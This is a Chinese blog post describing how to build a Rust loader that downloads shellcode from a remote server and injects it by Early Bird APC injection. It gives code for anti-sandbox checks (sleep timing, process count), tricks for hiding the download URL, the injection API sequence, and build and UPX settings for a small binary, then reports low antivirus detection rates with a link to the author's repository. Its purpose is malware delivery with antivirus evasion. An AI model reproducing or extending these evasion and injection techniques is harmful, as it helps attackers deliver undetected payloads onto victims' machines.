
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/bktown/p/18652145/rustloader-25373q" title="发布于 2025-01-04 17:29">
    <span role="heading" aria-level="2">Rust远程加载shellcode</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>学习rust, 练习写一个loader, 不足之处还请指教</p>
</blockquote>
<h2 id="编写">编写</h2>
<h3 id="隐藏黑框">隐藏黑框</h3>
<p>在注释掉所有打印语句后编译运行还是会弹黑框, 解决方法是头部添加一行（指定 Rust 编译器生成的可执行文件为 Windows 子系统应用程序，而不是控制台应用程序）:</p>
<pre><code class="language-bash">#![windows_subsystem = "windows"]
</code></pre>
<p>‍</p>
<h3 id="反沙箱">反沙箱</h3>
<p>流速检测</p>
<pre><code class="language-rust">pub fn ft() {
    use std::time::{Duration, Instant};
    use std::thread::sleep;

    let start_time = Instant::now();

    sleep(Duration::from_millis(5000));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() &lt; 5000 {
        std::process::exit(1);
    }
}
</code></pre>
<p>检查进程数</p>
<pre><code class="language-rust">pub fn pc() {
    let mut system = System::new_all();
    system.refresh_all();
    let process_count = system.processes().len();

    if process_count &lt;= 50 {
        std::process::exit(1);
    }
}
</code></pre>
<p>‍</p>
<h3 id="网络请求">网络请求</h3>
<p>使用轻量级的HTTP库<code>ureq</code>​, 示例如下：</p>
<pre><code class="language-rust">use ureq;

fn main() {
    let response = ureq::get("https://example.com/file.zip")
        .call()
        .expect("Failed to make request");

    if response.status() == 200 {
        let content = response.into_string().expect("Failed to read response");
        println!("Downloaded file: {}", content);
    } else {
        eprintln!("Failed to download file, status code: {}", response.status());
    }
}

</code></pre>
<p>不要直接硬编码url在代码中，然后就用管用伎俩简单编码一下，但是一整个解码使用居然不成， 问gpt说可能产生了不可见字符</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172710480-956979794.png" alt="image" loading="lazy">​</p>
<p>拆成protocol，host, port, pattern后解码组合就可以正常读取了， DIE中也没有检出（这个patcher还是要处理一下）</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172713323-2064285237.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="加载shellcode">加载shellcode</h3>
<p>这里我没有对shellcode进行任何处理, 获取之后直接使用<code>Early Bird</code>​进行注入, 简述一下过程:</p>
<ol>
<li>使用 <code>CreateProcessA</code>​ 创建一个进程。</li>
<li>使用 <code>VirtualAllocEx</code>​ 在目标进程中分配远程内存。</li>
<li>使用 <code>WriteProcessMemory</code>​ 将 SHELLCODE 复制到已分配的内存中。</li>
<li>使用 <code>VirtualProtectEx</code>​ 更改内存权限为可执行。</li>
<li>使用 <code>QueueUserAPC</code>​ 执行进程。</li>
<li>使用 <code>ResumeThread</code>​ 恢复进程的线程。</li>
<li>使用 <code>CloseHandle</code>​ 关闭已打开的句柄。</li>
</ol>
<p>对于错误处理一律退出不使用panic, 可以在代码中细看。</p>
<h3 id="编译优化">编译优化</h3>
<p>为了缩小体积, 在<code>_config.yml</code>​中添加</p>
<pre><code class="language-bash">[profile.release]
# 设置为1个块最大化优化，但时间会更长
codegen-units = 1
# 设置为s时，编译器会优先考虑生成最小的二进制文件大小，同时保持合理的性能
opt-level = "s"
# 链接时优化，可以显著减小二进制文件的大小，并提高性能
lto = true
# 禁止符号表和调试
debug = false
# 剥离调试信息
strip = true
# 崩溃时不希望看到调试信息
panic = "abort"
</code></pre>
<p>另外使用压缩库<code>miniz_oxide</code>​，添加上依赖：</p>
<pre><code class="language-bash">[dependencies]
miniz_oxide = "0.5"
</code></pre>
<p>最后使用release 通用发布：</p>
<pre><code class="language-bash">cargo build --release
</code></pre>
<p>使用<code>cargo-strip</code>​在构建后剥离二进制文件中的调试信息和其他不必要的数据。</p>
<pre><code class="language-bash">cargo install cargo-strip
cargo strip -t target/release/RustLoader.exe
</code></pre>
<p>此时大小基本为1.5MB, 也可以继续upx压缩(patcher要注意处理一下)， 之后按需加资源</p>
<pre><code class="language-bash">upx -9 --best --force target/release/RustLoader.exe
</code></pre>
<p>‍</p>
<h2 id="免杀效果">免杀效果</h2>
<p>添加反沙箱后, 无法在虚拟机中测试, 以下测试均使用直接生成的产物(不使用upx, upx-patcher, 反沙箱), 截止测试之时:</p>
<p>微步检出率为<code>1/28</code>​</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172716375-191520426.png" alt="image" loading="lazy">​</p>
<p>火绒</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172748521-1038769600.png" alt="image" loading="lazy">​</p>
<p>腾讯电脑管家</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172810312-76404917.png" alt="image" loading="lazy">​</p>
<p>360</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172834266-1728598070.png" alt="image" loading="lazy">​</p>
<p>defender</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250104172857680-251218996.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>如果觉得可以欢迎star一起交流~ ： <a href="https://github.com/BKLockly/RustLoader" target="_blank" rel="noopener nofollow">传送门</a></p>
<p>‍</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.9475611692789352" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-01-04 17:33">2025-01-04 17:29</span>&nbsp;
<a href="https://www.cnblogs.com/bktown">lockly</a>&nbsp;
阅读(<span id="post_view_count">75</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18652145" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18652145);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18652145', targetLink: 'https://www.cnblogs.com/bktown/p/18652145/rustloader-25373q', title: 'Rust远程加载shellcode' })">举报</a>
</div>
        